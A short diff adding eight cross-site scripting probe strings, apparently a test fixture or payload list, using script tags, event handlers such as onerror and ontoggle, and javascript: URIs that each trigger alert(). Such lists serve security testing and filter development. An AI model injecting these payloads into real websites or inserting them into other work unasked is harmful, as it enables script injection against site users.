@@ -1,0 +1,8 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(document.domain)>
+javascript:alert('xss')
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert('xss')>
+<a href=javascript:alert(1)>click</a>
+<details open ontoggle=alert(1)>
